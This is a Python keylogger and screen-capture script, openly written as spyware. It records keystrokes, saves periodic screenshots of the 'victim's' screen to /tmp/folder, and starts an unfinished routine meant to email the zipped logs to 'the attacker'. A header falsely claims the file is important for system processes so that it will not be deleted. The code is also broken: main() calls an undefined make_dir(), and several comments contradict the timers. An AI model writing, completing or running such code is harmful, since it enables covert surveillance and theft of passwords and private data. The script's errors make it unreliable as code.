#!/usr/bin/env python3

'''
Name : Alexis Rodriguez
Date : 2020-02-09
THIS FILE IS IMPORTANT FOR SYSTEM PROCESSES... PLEASE DO NOT ERASE!!
'''

from pynput import keyboard
import pyautogui as pygrab
import threading
import mechanize
import zipfile, sys, os, time
import subprocess

log = ''

def main():
	global log
	directory, to_append = make_dir(), 'log_' + make_name()
	save_screen()
	zip_and_send(directory,to_append)
	# start the keylogger
	with keyboard.Listener(
		on_press=on_press) as listener:
		log_to_file()
		listener.join()

'''
make directory in /tmp folder
'''
def make_get_dir():
	try:
		dir_to_create = "/tmp/folder/"
		os.mkdir(dir_to_create)
	except OSError:
		pass
	return dir_to_create

'''
Handles the action taken when a 
key is pressed.
'''
def on_press(key):
	global log
	try:
		log += str(key.char)
	# handling special characters
	except AttributeError:
		if key == key.space:
			log += ' '
		elif key == key.enter: log += '\n'
		elif key == key.backspace: log += ''
		elif key == key.ctrl: log += ' ctrl+'
		else:
			log += str(key)

'''
Logging to a file every 5 seconds
'''
def log_to_file():
	global log
	# open file
	f = open(make_get_dir() + 'log.txt', 'w')
	# write log to file
	f.write(log)
	# every 30 seconds invoke this function
	clock = threading.Timer(30, log_to_file)
	clock.start()

'''
get time image was taken append it to 
the name of the images file
'''
def make_name():
	seconds_since_epoch = time.time()
	date = time.ctime(seconds_since_epoch).split()
	return date[1] + '-' + date[2] + '-' + date[3]

'''
Take a screenshot of the victions computer
every minute and save it to /tmp/folder directory
'''
def save_screen():
	# take a screenshot
	image = pygrab.screenshot()
	# get time to append to image file name
	time = make_name()
	# save image to the directory that was created
	image.save(r'/tmp/folder/normal_' + time + '.png')
	# repeat function every two minutes
	take_screen = threading.Timer(120, save_screen)
	take_screen.start()

'''
Zip the folder that was created and 
email the zipped folder to the attacker
Params : directory to zip, name of zipped file
'''
def zip_and_send(direc, zip_name):
	# create browser
	brow = mechanize.Browser()
		     
	
if __name__ == '__main__':
	main()
